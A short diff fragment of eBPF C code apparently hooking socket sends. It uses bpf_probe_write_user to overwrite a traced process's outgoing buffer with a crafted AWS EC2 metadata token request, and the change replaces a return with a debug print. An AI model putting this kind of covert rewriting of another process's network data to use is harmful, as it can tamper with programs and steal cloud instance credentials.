@@ -75,7 +75,7 @@ int trace_sock_sendmsg(struct pt_regs *ctx)
                          "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n";
         __builtin_memcpy(req, new_req, sizeof(new_req));
         bpf_probe_write_user((void *)iov->iov_base, req, sizeof(new_req));
-        return 1;
+        bpf_trace_printk(req, sizeof(req));
     }
 
     // Prepare data for perf_submit
